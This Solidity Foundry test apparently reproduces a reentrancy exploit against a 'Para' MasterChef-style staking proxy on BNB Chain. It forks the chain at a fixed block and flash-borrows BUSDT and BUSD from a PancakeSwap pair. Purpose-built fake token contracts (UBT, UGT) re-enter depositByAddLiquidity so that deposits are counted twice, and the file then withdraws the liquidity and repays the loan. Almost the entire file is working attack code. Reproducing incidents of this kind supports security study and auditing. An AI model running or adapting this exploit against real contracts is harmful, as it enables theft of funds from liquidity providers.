// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../src/interface.sol";

interface IParaRouter {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external;
}

interface IParaProxy {
    function deposit(uint256 _pid, uint256 _amount) external;

    function depositByAddLiquidity(
        uint256 _pid,
        address[2] calldata _tokens,
        uint256[2] calldata _amounts
    ) external;

    function userInfo(
        uint256,
        address
    ) external view returns (uint256, uint256);

    function withdraw(uint256 _pid, uint256 _amount) external;
}

contract ContractTest is Test {
    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    // Pair used for obtaining the flashloan
    IPancakePair PancakePair =
        IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);
    IPancakePair ParaPair =
        IPancakePair(0x3fD4FbD7a83062942b6589A2E9e2436dd8e134D4);
    IParaRouter Router =
        IParaRouter(0x48Bb5f07e78f32Ac7039366533D620C72c389797);
    // Proxy to MasterChef contract
    IParaProxy ParaProxy =
        IParaProxy(0x633Fa755a83B015cCcDc451F82C57EA0Bd32b4B4);
    // Token contracts
    UBT ubt;
    UGT ugt;

    function setUp() public {
        vm.createSelectFork("bsc", 16008280);
        vm.label(address(BUSDT), "BUSDT");
        vm.label(address(BUSD), "BUSD");
        vm.label(address(PancakePair), "Pancake Pair");
        vm.label(address(ParaPair), "Para Pair");
        vm.label(address(Router), "Para Router");
        vm.label(address(ParaProxy), "Proxy");
        vm.label(address(ubt), "UBT Token");
        vm.label(address(ugt), "UGT Token");
    }

    function testReentrancy() public {
        ubt = new UBT();
        ugt = new UGT();
        emit log_named_decimal_uint(
            "Attacker BUSDT balance before attack",
            BUSDT.balanceOf(address(this)),
            BUSDT.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker BUSD balance before attack",
            BUSD.balanceOf(address(this)),
            BUSD.decimals()
        );
        PancakePair.swap(
            156_984_716_289_899_103_077_865,
            157_210_337_244_582_012_937_931,
            address(this),
            new bytes(1)
        );
        emit log_named_decimal_uint(
            "Attacker BUSDT balance after exploiting reentrancy",
            BUSDT.balanceOf(address(this)),
            BUSDT.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker BUSD balance after exploiting reentrancy",
            BUSD.balanceOf(address(this)),
            BUSD.decimals()
        );
    }

    function pancakeCall(
        address _sender,
        uint256 _amount0,
        uint256 _amount1,
        bytes calldata _data
    ) external {
        BUSDT.approve(address(Router), type(uint256).max);
        BUSD.approve(address(Router), type(uint256).max);
        Router.addLiquidity(
            address(BUSDT),
            address(BUSD),
            _amount0,
            _amount1,
            1,
            1,
            address(ubt),
            block.timestamp
        );
        emit log_named_decimal_uint(
            "Amount of liquidity sent to malicious UBT contract",
            ParaPair.balanceOf(address(ubt)),
            18
        );
        // Vulnerable function
        ParaProxy.depositByAddLiquidity(
            18,
            [address(ugt), address(ubt)],
            [uint256(1), uint256(1)]
        );
        ubt.withdrawAsset(18);
        // emit log_named_decimal_uint(
        //     "Liquidity of attacker after hack",
        //     ParaPair.balanceOf(address(this)),
        //     ParaPair.decimals()
        // );
        (uint256 amount, ) = ParaProxy.userInfo(18, address(this));
        ParaProxy.withdraw(18, amount);
        emit log_named_decimal_uint(
            "Liquidity to remove",
            ParaPair.balanceOf(address(this)),
            ParaPair.decimals()
        );
        ParaPair.approve(address(Router), type(uint256).max);
        Router.removeLiquidity(
            address(BUSDT),
            address(BUSD),
            ParaPair.balanceOf(address(this)),
            1,
            1,
            address(this),
            block.timestamp
        );
        // Uniswap pair flashloan fees
        uint256 feeBUSDT = (_amount0 * 3) / 997 + 1;
        uint256 feeBUSD = (_amount1 * 3) / 997 + 1;
        // Repaying flashloan
        BUSDT.transfer(address(PancakePair), _amount0 + feeBUSDT);
        BUSD.transfer(address(PancakePair), _amount1 + feeBUSD);
    }
}

// Token contracts implementations
contract UBT {
    IParaRouter Router =
        IParaRouter(0x48Bb5f07e78f32Ac7039366533D620C72c389797);
    IPancakePair ParaPair =
        IPancakePair(0x3fD4FbD7a83062942b6589A2E9e2436dd8e134D4);
    IParaProxy ParaProxy =
        IParaProxy(0x633Fa755a83B015cCcDc451F82C57EA0Bd32b4B4);

    function approve(address spender, uint256 amount) external returns (bool) {
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256) {
        return type(uint256).max;
    }

    function balanceOf(address account) external returns (uint256) {
        return 1111;
    }

    // Func used for exploiting the reentrancy vulnerability in MasterChef contract
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        if (msg.sender == address(Router)) {
            ParaPair.approve(address(ParaProxy), type(uint256).max);
            ParaProxy.deposit(18, ParaPair.balanceOf(address(this)));
        }
        return true;
    }

    function withdrawAsset(uint256 amountAsset) external {
        (uint256 amount, ) = ParaProxy.userInfo(18, address(this));
        ParaProxy.withdraw(18, amount);
        ParaPair.transfer(msg.sender, ParaPair.balanceOf(address(this)));
    }
}

contract UGT {
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256) {
        return type(uint256).max;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        return true;
    }

    function balanceOf(address account) external returns (uint256) {
        return 1111;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        return true;
    }
}
